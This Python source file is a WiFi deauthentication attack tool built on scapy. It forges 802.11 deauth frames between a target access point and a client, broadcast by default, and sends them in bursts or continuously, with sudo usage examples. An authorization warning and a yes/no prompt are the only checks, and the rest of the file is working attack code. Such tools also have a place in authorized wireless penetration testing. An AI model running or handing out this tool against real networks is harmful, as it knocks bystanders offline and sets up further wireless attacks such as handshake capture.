#!/usr/bin/env python3
"""
WiFi Deauthentication Tool for Hoover
Sends deauthentication frames to disconnect clients from WiFi networks
Used for authorized security testing and network analysis
"""

import sys
import os
import argparse
import time
import subprocess
from typing import Optional

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.sendrecv import sendp

from utils import (
    validate_mac,
    validate_interface,
    check_monitor_mode,
    require_root,
    setup_logging,
)


class DeauthAttacker:
    def __init__(self, interface: str, target_bssid: str,
                 target_client: Optional[str] = None,
                 channel: Optional[int] = None) -> None:
        self.interface: str = interface
        self.target_bssid: str = target_bssid
        self.target_client: str = target_client or "ff:ff:ff:ff:ff:ff"
        self.channel: Optional[int] = channel
        self.packets_sent: int = 0
        self.logger = setup_logging("deauth")

    def set_channel(self) -> None:
        """Set the wireless interface to the specified channel."""
        if not self.channel:
            return

        try:
            if not validate_interface(self.interface):
                raise ValueError(f"Invalid interface name: {self.interface}")

            if not isinstance(self.channel, int) or self.channel < 1 or self.channel > 14:
                raise ValueError(f"Invalid channel: {self.channel}")

            result = subprocess.run(
                ['iwconfig', self.interface, 'channel', str(self.channel)],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                self.logger.info("Set %s to channel %d", self.interface, self.channel)
            else:
                self.logger.warning("Could not set channel: %s", result.stderr)
        except subprocess.TimeoutExpired:
            self.logger.warning("Timeout setting channel")
        except ValueError as e:
            self.logger.error("Error: %s", e)
        except Exception as e:
            self.logger.warning("Could not set channel: %s", e)

    def create_deauth_packet(self) -> list[object]:
        """Create deauthentication packets."""
        # Packet from AP to client
        packet1 = RadioTap() / Dot11(
            type=0,
            subtype=12,
            addr1=self.target_client,
            addr2=self.target_bssid,
            addr3=self.target_bssid
        ) / Dot11Deauth(reason=7)

        # Packet from client to AP
        packet2 = RadioTap() / Dot11(
            type=0,
            subtype=12,
            addr1=self.target_bssid,
            addr2=self.target_client,
            addr3=self.target_bssid
        ) / Dot11Deauth(reason=7)

        return [packet1, packet2]

    def send_deauth(self, count: int = 10, delay: float = 0.1) -> bool:
        """Send deauthentication packets."""
        if not validate_mac(self.target_bssid):
            self.logger.error("Invalid target BSSID: %s", self.target_bssid)
            return False

        if not validate_mac(self.target_client):
            self.logger.error("Invalid client MAC: %s", self.target_client)
            return False

        self.logger.info("Starting deauthentication attack")
        self.logger.info("Interface: %s", self.interface)
        self.logger.info("Target BSSID: %s", self.target_bssid)
        self.logger.info("Target Client: %s", self.target_client)
        if self.channel:
            self.logger.info("Channel: %d", self.channel)
        self.logger.info("Packets to send: %d", count)
        self.logger.info("Delay: %ss", delay)
        self.logger.info("Press Ctrl+C to stop\n")

        # Set channel if specified
        self.set_channel()

        # Create deauth packets
        packets: list[object] = self.create_deauth_packet()

        try:
            for i in range(count):
                for packet in packets:
                    sendp(packet, iface=self.interface, verbose=False)
                    self.packets_sent += 1

                self.logger.info("[%d/%d] Sent deauth packets (Total: %d)",
                                 i + 1, count, self.packets_sent)
                time.sleep(delay)

            self.logger.info("Attack completed. Sent %d packets", self.packets_sent)
            return True

        except KeyboardInterrupt:
            self.logger.info("\nAttack stopped by user. Sent %d packets", self.packets_sent)
            return False
        except Exception as e:
            self.logger.error("Error during attack: %s", e)
            return False

    def continuous_attack(self, delay: float = 0.1) -> bool:
        """Send deauthentication packets continuously."""
        if not validate_mac(self.target_bssid):
            self.logger.error("Invalid target BSSID: %s", self.target_bssid)
            return False

        if not validate_mac(self.target_client):
            self.logger.error("Invalid client MAC: %s", self.target_client)
            return False

        self.logger.info("Starting continuous deauthentication attack")
        self.logger.info("Interface: %s", self.interface)
        self.logger.info("Target BSSID: %s", self.target_bssid)
        self.logger.info("Target Client: %s", self.target_client)
        if self.channel:
            self.logger.info("Channel: %d", self.channel)
        self.logger.info("Delay: %ss", delay)
        self.logger.info("Press Ctrl+C to stop\n")

        # Set channel if specified
        self.set_channel()

        # Create deauth packets
        packets: list[object] = self.create_deauth_packet()

        try:
            while True:
                for packet in packets:
                    sendp(packet, iface=self.interface, verbose=False)
                    self.packets_sent += 1

                # Print status every 10 packets
                if self.packets_sent % 10 == 0:
                    self.logger.info("Sent %d deauth packets...", self.packets_sent)

                time.sleep(delay)

        except KeyboardInterrupt:
            self.logger.info("\nAttack stopped by user. Sent %d packets", self.packets_sent)
            return False
        except Exception as e:
            self.logger.error("Error during attack: %s", e)
            return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WiFi Deauthentication Tool - Disconnect clients from WiFi networks",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Deauth all clients from an access point (10 packets)
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55

  # Deauth specific client (50 packets)
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF -n 50

  # Continuous deauth attack
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --continuous

  # Deauth with specific channel
  sudo python3 deauth.py -i wlan0mon -b 00:11:22:33:44:55 -ch 6 -n 100

Note:
  - Interface must be in monitor mode
  - Target BSSID is the MAC address of the access point
  - Target client is optional (defaults to broadcast - all clients)
  - This tool is for authorized security testing only!
        """
    )

    parser.add_argument('-i', '--interface', required=True,
                        help='Wireless interface in monitor mode')
    parser.add_argument('-b', '--bssid', required=True,
                        help='Target BSSID (MAC address of access point)')
    parser.add_argument('-c', '--client',
                        help='Target client MAC address (default: broadcast to all)')
    parser.add_argument('-n', '--count', type=int, default=10,
                        help='Number of deauth packets to send (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0.1,
                        help='Delay between packets in seconds (default: 0.1)')
    parser.add_argument('-ch', '--channel', type=int,
                        help='WiFi channel to use (optional)')
    parser.add_argument('--continuous', action='store_true',
                        help='Send deauth packets continuously until stopped')

    args = parser.parse_args()

    logger = setup_logging("deauth")

    # Check if running as root
    require_root()

    # Check if interface is in monitor mode
    if not check_monitor_mode(args.interface):
        logger.warning("%s may not be in monitor mode", args.interface)
        logger.warning("Enable monitor mode with: sudo airmon-ng start <interface>")
        response = input("Continue anyway? (y/N): ")
        if response.lower() != 'y':
            sys.exit(1)

    # Authorization warning
    print("\n" + "=" * 70)
    print("WARNING: Deauthentication Attack Tool")
    print("=" * 70)
    print("\nThis tool sends WiFi deauthentication frames that will disconnect")
    print("clients from wireless networks. This is a DISRUPTIVE action!")
    print("\nOnly use this tool:")
    print("  - On networks you own or have written authorization to test")
    print("  - For authorized penetration testing or security research")
    print("  - In compliance with all applicable laws and regulations")
    print("\nUnauthorized use may violate:")
    print("  - Computer Fraud and Abuse Act (CFAA)")
    print("  - Federal Wiretap Act")
    print("  - Local computer crime laws")
    print("=" * 70)

    response = input("\nDo you have authorization to perform this attack? (yes/no): ")
    if response.lower() != 'yes':
        logger.info("Attack cancelled - Authorization required")
        sys.exit(1)

    # Create attacker instance
    attacker = DeauthAttacker(
        interface=args.interface,
        target_bssid=args.bssid,
        target_client=args.client,
        channel=args.channel
    )

    # Perform attack
    if args.continuous:
        attacker.continuous_attack(delay=args.delay)
    else:
        attacker.send_deauth(count=args.count, delay=args.delay)


if __name__ == "__main__":
    main()
